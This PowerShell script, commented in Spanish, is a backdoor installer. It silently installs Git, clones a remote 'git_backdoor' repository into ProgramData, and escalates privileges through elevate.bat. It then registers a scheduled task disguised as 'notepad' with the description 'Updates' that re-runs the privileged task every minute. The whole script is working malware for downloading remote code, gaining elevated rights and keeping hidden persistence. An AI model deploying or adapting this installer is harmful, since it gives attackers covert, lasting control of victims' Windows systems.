# ================================================
# ================================================
# ================================================
# ================================================
# ================================================
# ================================================
# Configuración

## Cambiar los valores conforme a las necesidades, ver Anexo 0 del README.md

### Ubucacion principal en que se creará el programa
$location_root = $env:ProgramData # c:\ProgramData\

### Carpeta para contener el programa
$folder_name = "backdoor_program"

### Programa a ejecutar
$program_to_execute = "main.ps1" 

### Repositorio del que se descargará el archivo a ejecutar
$git_origin = "https://github.com/elcaza/git_backdoor.git" # Your repository

### Nombre de la tarea con privilegios elevados
$privileged_task = "privileged_task"

### Nombre de la tarea programada
$recurrent_task = "notepad"

### Programa a ejecutar 
#$task_to_execute = "%windir%\System32\cmd.exe"
$task_to_execute = "C:\ProgramData\backdoor_program\windows\run.bat"
# End Configuración
# ================================================
# ================================================
# ================================================
# ================================================
# ================================================
# ================================================

$is_git_ready=$false
$program_git_location = $location_root+"\"+$folder_name
$program_location = $location_root+"\"+$folder_name+"\windows\"
$program_src_location = $program_location+"\src\"
$git_client = "https://github.com/git-for-windows/git/releases/download/v2.24.0.windows.1/Git-2.24.0-64-bit.exe"


# Corroboramos si git está instalado
## Retorna true si está instalado
function is_git_installed {
	try {
		git | Out-Null
		"FN: Git is installed"
		return $true
	} catch [System.Management.Automation.CommandNotFoundException] {
		return $false
	}
}

# Descargamos git
function download_git {
	$job = Start-Job { 
		# Con el $using bindeamos el contexto de la función para enviar la variable program_location
		Set-Location $using:program_git_location
		function download_git {
			"FN: Descargando git..."
			Invoke-WebRequest -Uri $using:git_client -OutFile ".\git.exe"
		} download_git
	}
	# Creamos una tarea asincrona
	Wait-Job $job
	Receive-Job $job
	"FN: Git Descargado"
}

# Instalamos git
function install_git {
	"FN: Instalando git"
	Set-Location $program_git_location
	try {
		Start-Process "git.exe" -argumentlist "/VERYSILENT /passive /norestart" -wait
	} catch {
		"FN: error"
	}
}

# Refresca las variables de entorno para encontrar git
function refresh_path {
	$job = Start-Job { 
		function refresh_path {
			$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") +
			";" +
			[System.Environment]::GetEnvironmentVariable("Path","User")
		} refresh_path	
	}
	# Creamos una tarea asincrona
	Wait-Job $job
	Receive-Job $job
	"FN: Path actualizado"

	$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") +
		";" +
		[System.Environment]::GetEnvironmentVariable("Path","User")
}

# Si tiene git instalado y puede encontrarlo descarga el repositorio del backdoor
function download_backdoor {
	$job = Start-Job { 
		# Con el $using bindeamos el contexto de la función para enviar la variable program_location
		"Estoy en..."
		pwd
		sleep -s 5
		Set-Location $using:program_git_location
		function download_repo {
			"FN: Inicializando repositorio..."
            git init
			git config user.name "John Doe"
			git config user.email "johndoe@example.com"
			git remote add origin $using:git_origin

			
            # Descargando payload
			"FN: Clonado repositorio..."
            git pull origin master
		} download_repo	
	}
	# Creamos una tarea asincrona
	Wait-Job $job
	Receive-Job $job
	"FN: Backdoor descargado"
}

function elevate_privileges {
	"FN: Elevando privilegios git"
	Set-Location $program_src_location
	try {
		Start-Process "elevate.bat" -argumentlist "$privileged_task $task_to_execute" -wait
	} catch {
		"FN: error"
	}
}

# Carga el backdoor como una tarea programada
function load_backdoor {
	
	# $argument_execute = "Start-Process powershell -Verb runAs; Set-Location $program_location; pwd; sleep -s 5; cat main.ps1; git pull origin master ; powershell -ExecutionPolicy Bypass .\main.ps1; sleep -s 5;"
	# $argument_execute = "Set-Location $program_location; pwd; sleep -s 5; cat main.ps1; git pull origin master ; powershell -ExecutionPolicy Bypass .\main.ps1; sleep -s 5;"

	# $action = New-ScheduledTaskAction -Execute powershell.exe -Argument $argument_execute

	# $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionDuration  (New-TimeSpan -Days 1)  -RepetitionInterval  (New-TimeSpan -Minutes 1)

	# Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "notepad" -Description "Updates"	

	$argument_execute = "schtasks.exe /run /tn 'Apps\$privileged_task'"

	$action = New-ScheduledTaskAction -Execute powershell -Argument $argument_execute

	$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionDuration  (New-TimeSpan -Days 1)  -RepetitionInterval  (New-TimeSpan -Minutes 1)

	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $recurrent_task -Description "Updates"	

}

# Inicializa el instalador
function start_installer{	
	# Si git no está instalado
	if( !(is_git_installed) ) {
		"Git no esta"
		try {
			"Creando ubicaciones"
			# Creando ubicaciones
			Set-Location $location_root
			mkdir $folder_name
			Set-Location $folder_name 
		} catch [System.Management.Automation.CommandNotFoundException] {
			"Error al crear ubicaciones"
		}
		try {
			refresh_path
		} catch {
			"FN: error"
			exit
		}
		"Descargando git"
		# Descargamos git
		download_git
		"Git descargado"

		"Instalando git"
		# Instalamos git
		install_git
		"Git instalado"


		$contador = 0
		while( !($is_git_ready) ){
			echo "intento $contador" 
			"Probando git"

			"Actualizando variables"
			# Actualizamos nuestra variables de entorno

			if(is_git_installed) {
				$is_git_ready=$true
				"Git ya fue encontrado"
				""
				git 
				""
				sleep -s 4
			}
			refresh_path
			
			if ( $contador -ge 10 ){
				$is_git_ready=$true
				"Por contador"
				"Git ya fue encontrado"
				""
				git 
				""
				sleep -s 4
			}
			$contador++
			"INSTALLER > Git no encontrado"
			Start-Sleep -s 5
		}
		"Probando path"
		refresh_path
	}

	"Probando path"
	refresh_path

	if( !(is_git_installed) ) {
		"Git no instalado"
		sleep -s 5
		exit
	} else {
		"Git si esta instalado"
		sleep -s 2
		
		#Download repo
		"INSTALLER Descargando backdoor"
		download_backdoor

		"INSTALLER descargado backdoor"
		sleep -s 2

		#Elevar privilegios
		"Elevando privilegios"
		elevate_privileges

		"privilegios elevados"

		# Creando tarea programada
		load_backdoor
		
		"ISNTALLER Programa finalizado"
		sleep -s 2
	}
}

start_installer